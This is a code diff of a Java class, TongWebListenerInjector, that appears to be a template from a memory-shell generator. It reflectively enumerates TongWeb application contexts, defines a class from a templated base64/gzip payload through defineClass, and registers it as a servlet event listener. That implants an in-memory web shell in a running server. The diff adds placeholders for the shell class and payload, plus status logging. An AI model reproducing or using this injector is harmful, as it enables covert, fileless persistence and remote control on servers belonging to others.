@@ -3,20 +3,26 @@ package org.leo.jmg.mem.injectortpl.tongweb;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  */
 public class TongWebListenerInjector {
-    
-    private static boolean ok;
 
-    private static String shellClassName;
-    private static String shellClass;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
 
     public TongWebListenerInjector() {
         if (ok) {
@@ -26,26 +32,42 @@ public class TongWebListenerInjector {
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-           
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
-                  
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                   
+                    msg += "[/*] ready\n";
                 } catch (Throwable e) {
-                   
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-
+        System.out.println(msg);
     }
 
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
 
     public Set<Object> getContext() throws Exception {
         Set<Object> contexts = new HashSet<Object>();
@@ -82,28 +104,28 @@ public class TongWebListenerInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-      
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
-    
+    @SuppressWarnings("all")
     public void inject(Object context, Object listener) throws Exception {
         Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners", null, null);
-        List<Object> listeners = Arrays.asList(objects);
+        List listeners = Arrays.asList(objects);
         for (Object o : listeners) {
-            if (o.getClass().getName().contains(shellClassName)) {
+            if (o.getClass().getName().contains(getClassName())) {
                 return;
             }
         }
@@ -111,23 +133,24 @@ public class TongWebListenerInjector {
         if (applicationEventListenersObjects != null) {
             Object[] appListeners = (Object[]) applicationEventListenersObjects;
             if (appListeners != null) {
-                List<Object> appListenerList = new ArrayList<Object>(Arrays.asList(appListeners));
+                List appListenerList = new ArrayList(Arrays.asList(appListeners));
                 appListenerList.add(listener);
                 setFieldValue(context, "applicationEventListenersObjects", appListenerList.toArray());
             }
-        } else {
-            Object existingListeners = getFieldValue(context, "applicationEventListenersList");
-            if (existingListeners instanceof List<?>) {
-                List<Object> appListeners = new ArrayList<Object>((List<?>) existingListeners);
+        } else if (getFieldValue(context, "applicationEventListenersList") != null) {
+            List<Object> appListeners = (List<Object>) getFieldValue(context, "applicationEventListenersList");
+            if (appListeners != null) {
                 appListeners.add(listener);
-                setFieldValue(context, "applicationEventListenersList", appListeners);
             }
         }
     }
 
+    @Override
+    public String toString() {
+        return msg;
+    }
 
-
-    
+    @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
         Class<?> decoderClass;
         try {
@@ -140,7 +163,7 @@ public class TongWebListenerInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
@@ -160,7 +183,7 @@ public class TongWebListenerInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         for (Class<?> clazz = obj.getClass();
              clazz != Object.class;
@@ -175,7 +198,7 @@ public class TongWebListenerInjector {
     }
 
 
-    
+    @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         try {
             Field field = getField(obj, name);
@@ -193,7 +216,7 @@ public class TongWebListenerInjector {
         field.set(obj, value);
     }
 
-    
+    @SuppressWarnings("all")
     public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
         Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
         Method method = null;
@@ -215,5 +238,18 @@ public class TongWebListenerInjector {
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
-
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
